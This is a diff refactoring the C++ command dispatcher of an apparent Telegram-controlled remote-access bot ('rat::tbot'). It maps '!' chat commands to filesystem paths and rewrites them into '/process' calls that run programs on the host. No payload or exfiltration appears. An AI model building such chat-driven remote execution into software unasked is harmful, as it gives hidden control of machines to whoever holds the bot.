@@ -42,13 +42,12 @@ void Handler::handleUpdate(rat::tbot::Update&& arg_Update) {
 }
 
 void Handler::dispatchDynamicCommand() {
-    std::string command_text = this->telegram_update.message.text;
+    std::string& command_text = this->telegram_update.message.text;
 
     if (!command_text.starts_with("!")) {
-        return; // not a dynamic command
+        return; 
     }
 
-    // Split "!directive rest"
     size_t first_space = command_text.find(' ');
     if (first_space == std::string::npos) {
         this->bot.sendMessage("Usage: !<command> <timeout> <args...>");
@@ -60,21 +59,19 @@ void Handler::dispatchDynamicCommand() {
     boost::trim(rest);
 
     // Lookup in map
-    auto it = this->state.dynamic_commands.find(directive);
-    if (it == this->state.dynamic_commands.end()) {
+    auto it = this->state.command_path_map.find(directive);
+    if (it == this->state.command_path_map.end()) {
         this->bot.sendMessage(fmt::format("Unknown command: '{}'", directive));
         return;
     }
 
-    std::string real_path = it->second;
+    std::filesystem::path& real_path = it->second;
 
     // Rewrite update message into /process form
     // "/process <timeout> <real_path> <args>"
-    std::string new_message = "/process " + rest;
-    new_message.insert(new_message.find(' ', 9) + 1, real_path + " "); 
-    // insert the path after timeout
+    std::string new_message = fmt::format("{}{}", "/process " , rest);
+    new_message.insert(new_message.find(' ', 9) + 1, real_path.string() + " "); 
 
-    // Overwrite the update so process handler sees it
     this->telegram_update.message.text = new_message;
 
     // Delegate to existing handler
@@ -84,15 +81,14 @@ void Handler::dispatchDynamicCommand() {
 void Handler::dispatchIntegratedCommand() {
     // Parse once and store in class member for handlers that need it
     DEBUG_LOG("Dispatching commands based on the update {}", this->telegram_update.id);
-    command = parseTelegramMessageToCommand();
+    this->parseTelegramMessageToCommand();
     
     for (const auto& handler : command_map) {
-        if (command.directive == handler.command) {
+        if (this->command.directive == handler.command) {
             (this->*handler.handler)();
             return;
         }
     }
-    // Handle unknown command
     this->bot.sendMessage(fmt::format("Unknown command: {}", command.directive));
 }
 
